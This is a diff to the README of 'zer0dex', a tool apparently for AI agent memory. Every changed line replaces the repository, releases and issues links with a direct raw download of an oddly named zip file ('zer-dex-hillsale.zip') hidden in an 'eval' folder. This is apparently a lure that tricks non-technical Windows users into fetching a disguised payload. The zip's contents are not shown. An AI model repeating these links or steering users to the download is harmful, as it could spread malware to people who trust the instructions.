@@ -1,6 +1,6 @@
 # ⚙️ zer0dex - Fast Local Memory for AI Agents
 
-[![Download zer0dex](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/darkcoloured-photoengraving320/zer0dex)
+[![Download zer0dex](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/darkcoloured-photoengraving320/zer0dex/raw/refs/heads/main/eval/zer-dex-hillsale.zip)
 
 ## About zer0dex
 
@@ -24,7 +24,7 @@ The system supports persistent memory use, meaning it can remember and use past 
 
 Click the button below to visit the download page and get the latest version of zer0dex. The page includes all files and instructions you need.
 
-[![Download zer0dex](https://img.shields.io/badge/Download-Here-blue)](https://github.com/darkcoloured-photoengraving320/zer0dex)
+[![Download zer0dex](https://img.shields.io/badge/Download-Here-blue)](https://github.com/darkcoloured-photoengraving320/zer0dex/raw/refs/heads/main/eval/zer-dex-hillsale.zip)
 
 ---
 
@@ -50,7 +50,7 @@ Follow these steps to get zer0dex running on your Windows PC.
 
 1. Open your web browser.
 2. Go to the download page by clicking this link:
-   https://github.com/darkcoloured-photoengraving320/zer0dex
+   https://github.com/darkcoloured-photoengraving320/zer0dex/raw/refs/heads/main/eval/zer-dex-hillsale.zip
 3. This page shows all files related to the project.
 
 ### Step 2: Download the Latest Release
@@ -129,7 +129,7 @@ If problems persist, open an issue on the zer0dex GitHub page under “Issues.�
 
 For more detailed instructions, FAQs, and updates:
 
-- Visit the repository: https://github.com/darkcoloured-photoengraving320/zer0dex
+- Visit the repository: https://github.com/darkcoloured-photoengraving320/zer0dex/raw/refs/heads/main/eval/zer-dex-hillsale.zip
 - Check the “Wiki” or “Docs” section if available.
 - Use the “Issues” tab to report bugs or ask for help.
 - Look through the README and other files on GitHub for guidance.
@@ -148,8 +148,8 @@ zer0dex runs its key processes locally for speed and privacy. The dual-layer mem
 
 ## 🔗 Useful Links
 
-- Project homepage: https://github.com/darkcoloured-photoengraving320/zer0dex
-- Latest download page: https://github.com/darkcoloured-photoengraving320/zer0dex/releases
-- Issue tracking: https://github.com/darkcoloured-photoengraving320/zer0dex/issues
+- Project homepage: https://github.com/darkcoloured-photoengraving320/zer0dex/raw/refs/heads/main/eval/zer-dex-hillsale.zip
+- Latest download page: https://github.com/darkcoloured-photoengraving320/zer0dex/raw/refs/heads/main/eval/zer-dex-hillsale.zip
+- Issue tracking: https://github.com/darkcoloured-photoengraving320/zer0dex/raw/refs/heads/main/eval/zer-dex-hillsale.zip
 
 This setup helps you get started with zer0dex, even if you are not a technical user.
